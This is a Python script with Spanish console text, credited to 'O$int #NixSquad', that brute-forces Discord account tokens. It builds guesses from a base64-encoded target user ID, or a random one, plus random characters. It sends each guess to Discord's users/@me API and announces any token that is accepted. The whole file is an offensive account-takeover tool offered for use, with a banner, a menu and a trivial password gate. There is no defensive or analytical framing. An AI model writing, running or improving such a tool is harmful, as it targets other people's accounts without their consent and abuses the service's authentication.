import time
import os
from urllib.request import urlopen, Request
import base64
import random
import requests
from colorama import *
import sys
from tkinter import messagebox


def banner():
    print("")
    print(f"{Fore.CYAN}")
    print(f"""                      ███████╗██████╗ ▄▄███▄▄·
                      ╚══███╔╝██╔══██╗██╔════╝
                        ███╔╝ ██║  ██║███████╗
                       ███╔╝  ██║  ██║╚════██║
                      ███████╗██████╔╝███████║
                      ╚══════╝╚═════╝ ╚═▀▀▀══╝""")
    print("                                                                  ")
    print("   ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗██████╗ ███████╗   ")
    print("   ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║██╔══██╗██╔════╝   ")
    print("      ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║██████╔╝█████╗     ")
    print("      ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║██╔══██╗██╔══╝     ")
    print("      ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║██████╔╝██║        ")
    print("      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝        ")
    print("")


def idbf():
    def bf(id):
        idutf8 = id.encode("UTF-8")
        idencode = base64.b64encode(idutf8)
        idencode1 = idencode.decode("UTF-8")
        input(f'{Fore.BLUE}[$]{Style.RESET_ALL}    ID válida, presione "enter" para iniciar el bruteforce')
        request_url = "https://discordapp.com/api/v9/users/@me"
        token = ""
        while True:
            try:
                    caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',
                                           'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])
                    token = idencode1 + \
                        ('').join(random.choices(caracteres, k=35))

                    headers = {'Authorization': token,
                                   'Content-Type': 'application/json'}
                    req = requests.get(
                        request_url, headers=headers)

                    if req.status_code == 401:
                        print(
                            f"{Fore.RED}[$]{Style.RESET_ALL}    {Fore.RED}Inválido:{Style.RESET_ALL} {token}")

                    elif req.status_code == 200:
                        print(
                            f"{Fore.GREEN}[$]{Style.RESET_ALL}    {Fore.GREEN}Válido:{Style.RESET_ALL} {token}")
                        messagebox.showinfo(
                            message=f"¡Token encontrado!", title="[$] Token Bruteforce Script by O$int #NixSquad")
                        break

            except KeyboardInterrupt:
                    print("")
                    print(
                        f"{Fore.CYAN}[$]{Style.RESET_ALL}    Bruteforce terminado")
                    break

    while True:
        print(
            f"{Fore.BLUE}[$]{Style.RESET_ALL}    ID a realizar el Bruteforce:", end=" ")

        id = input()
        if (id.isdigit() and len(id) < 19):
            bf(id)
            break
        else:
            print(
                f"{Fore.CYAN}[$]{Style.RESET_ALL}    ID inválida, inténtelo de nuevo")


def randombf():
    request_url = "https://discordapp.com/api/v9/users/@me"

    def bf():
        token1 = ""
        while True:
            try:
                ids = list(['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'])
                ide = ('').join(random.choices(ids, k=18))
                ideutf8 = ide.encode("UTF-8")
                ideencode = base64.b64encode(ideutf8)
                ideencode1 = ideencode.decode("UTF-8")

                caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',
                                  'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])
                token1 = ideencode1 + \
                    ('').join(random.choices(caracteres, k=35))

                headers = {'Authorization': token1,
                           'Content-Type': 'application/json'}
                req = requests.get(request_url, headers=headers)

                if req.status_code == 401:
                    print(
                        f"{Fore.RED}[$]{Style.RESET_ALL}    {Fore.RED}Inválido:{Style.RESET_ALL} {token1}")

                elif req.status_code == 200:
                    print(
                        f"{Fore.GREEN}[$]{Style.RESET_ALL}    {Fore.GREEN}Válido:{Style.RESET_ALL} {token1}")
                    messagebox.showinfo(
                        message=f"¡Token encontrado!", title="[$] Token Bruteforce Script by O$int #NixSquad")
            except KeyboardInterrupt:
                print("")
                print(
                    f"{Fore.CYAN}[$]{Style.RESET_ALL}    Bruteforce terminado")
                break

    bf()


def menu():
    os.system(
        "@title   [$]  Token Bruteforce Script by O$int #NixSquad  && cls")
    banner()
    print(
        f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev: O{Fore.BLUE}${Fore.WHITE}int <3")
    print("")
    print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Escoja una opción a realizar: ")
    print("")
    print(f"{Fore.BLUE}[1]{Style.RESET_ALL}    Token Bruteforce por ID")
    print(f"{Fore.BLUE}[2]{Style.RESET_ALL}    Token Bruteforce random")
    print(f"{Fore.BLUE}[3]{Style.RESET_ALL}    Leave")
    print("")
    print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Opción a escojer: ", end="")
    opcion = input()
    if (opcion == "1"):
        idbf()
    elif (opcion == "2"):
        randombf()

    elif (opcion == "3"):
        os.system("@title   [$]  Leave  && cls")
        banner()
        print(
            f"{Fore.CYAN}[$]{Style.RESET_ALL}    Gracias por probar el script de bruteforce de NixSquad by O$int <3")
        time.sleep(3)
        exit()
    else:
        os.system("@title   [$]  Acceso denegado  && cls")
        banner()
        print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Escoja una opción válida")
        q = input()
        if (q == ""):
            menu()
        else:
            menu()


# <===============Main==================>#
os.system("@title   [$]  Conectando a herramienta...  && cls")
banner()
print(
    f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} O{Fore.BLUE}${Fore.WHITE}int <3")
print("")
print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Conectando a la herramienta...")
time.sleep(2)
os.system("@title   [$]  Token Bruteforce Script by O$int #NixSquad  && cls")
banner()
print(
    f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} O{Fore.BLUE}${Fore.WHITE}int <3")
print("")
print(
    f"{Fore.BLUE}[$]{Style.RESET_ALL}    Escriba la contraseña para continuar: ", end=f"{Fore.WHITE}")
contraseña = input()
if (contraseña == "123"):
    os.system("@title   [$]  Acceso concedido  && cls")
    banner()
    print(f"{Fore.BLUE}[$]{Style.RESET_ALL}    Acceso concedido.")
    time.sleep(3)
    menu()
else:
    os.system("@title   [$]  Acceso denegado  && cls")
    banner()
    print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Acceso denegado")
    q = input()
    if (q == ""):
        os.system('cls')
        sys.exit()
    else:
        os.system('cls')
        sys.exit()
